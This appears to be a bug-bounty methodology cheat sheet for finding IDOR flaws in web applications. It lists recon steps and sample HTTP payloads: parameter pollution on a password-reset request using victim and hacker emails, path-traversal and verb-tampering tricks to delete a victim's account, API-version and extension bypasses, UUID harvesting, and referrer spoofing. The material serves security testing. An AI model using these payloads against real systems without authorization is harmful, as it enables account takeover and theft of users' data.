# Insecure direct Object Reference (IDOR)

In order to find IDOR, you should use appropriate recon and some techniques.

## Methodology

- [Application Recon] - Fuzz the endpoints which return information
- [Application Recon] - Conduct application and search in JavaScript files for API endpoints and parameters
- Conduct tests on any object which returns information (easy to test, hard to discover)
- Conduct tests on state-changing functionalities, it’s more tricky (easy to test, easy to discover)
- Some tips:
    - In some web application you face **UUID** or something similar, it’s not IDOR unless you can leak others users **UUIDs**
    - There may be endpoints to translate emails or other properties into **UUIDs**, check for those
    - If you face a value which seem to be random, try to generate more values to fine a pattern
    - Leverage **Mass Assignment to discover** IDOR in state-changing functionalities
    - Use parameter pollution to discover IDOR or bypass the forbidden action
    - Decode the values which seem to be base64

## How to test

- Endpoint fuzzing

```html
/endpoints/users/me
/endpoints/**[FUZZ]**/**[FUZZ]**
```

- Add parameters to the endpoints which return the information

```html
GET /api/v1/getuser
[...]

**use:**

GET /api/v1/getuser?**id=1337 -> where you find this? from js files! and you fuzzing wordlist kite runner**
[...]
```

- Use parameters pollution in state-changing requests (even non state-changing)

```html
POST /api/forget_password
[...]
email=victim_email**&email=hacker_email

use:**

POST /api/forget_passwrod
[...]
{"email":"victim_email", **"email":"hacker_email"}**

GET /api/users/user_id=ligimet**&user_id=victim** 

GET /api/users/user_id=victim**&user_id=ligimet**
```

- Use extensions to bypass forbidden actions

```html
GET /v2/GetData/1234 --> 403 forbidden 
[...]

GET /v2/GetData/1234**.json** --> 200 ok
[...]
```

- Test on outdated API version (or even upcoming version)

```html
POST /v2/GetData
[...]
id=1234

**use:**

POST /**v1**/GetData
[...]
id=1234
```

- Manipulate JSON packets

```html
POST /api/get_profile
[]
{"id":"111"}

**use:**

POST /api/get_profile
[]
{"id":"[1111]"}

POST /api/get_profile
[...]
{"user_id":**{"user_id":"111"}}**
```

- Finding UUID
    - Wayback machine
    - Alien vault OTX
    - URL Scan
    - Common Crwal
    - Google Search
    - Github Search
    - Referrer header
    - Js files
- Try to swap uuid with number

```html
GET /file?id=ef0930894-e98dj930-uba938

use:

GET /file**?id=1**
```

- Many endpoints take complicate object IDs, like **UUIDs** or so, try **numeric integer IDs** on all
- Abusing the revers proxy

```html
POST /users/delete/VICTIM_ID --> 403 forbidden

**Use:**

POST /users/delete/**MY_ID/../VICTIM_ID** --> 200 OK
POST /users/delete/**MY_ID/%2f%2e%2e%2eVICTIM_ID** --> 200 OK
```

- use verb tampering to bypass forbidden

```html
POST /users/delete/VICTIM_ID --> 403 forbidden

use:

**DELETE** /users/delete/VICTIM_ID --> 200 ok
```

- Try to discover hidden parameter even-though there is an ID in the request (guess, extract or fuzz parameters)

```html
GET /v2/profile/1000 --> 200 OK
GET /v2/profile/1001 --> 403 forbidden

**use:**

GET /v2/profile/1000?**[FUZZ]=**1001
GET /v2/profile/1000?**user_id=1001** --> 200 ok

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /v2/profile
[...]
name=ali&email=ali@gmail.com

**use:**

POST /v2/profile?**user_id=1001**
[...]
name=ali&email=ali@gmail.com

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /v2/profile
[...]
user_id=1000

use:

POST /v2/profile?**user_id=1001**
[...]
user_id=1000
```

- Use Special characters

```
api/user/01* 
api/user/*
api/user/%
api/user/_
api/user/.
```

- Checking Referrer

```
GET /user/02 
Referrer: example.com/users/**01**          -> 403 forbidden

GET /user/02 
Referrer: example.com/users/02          -> 200 OK

```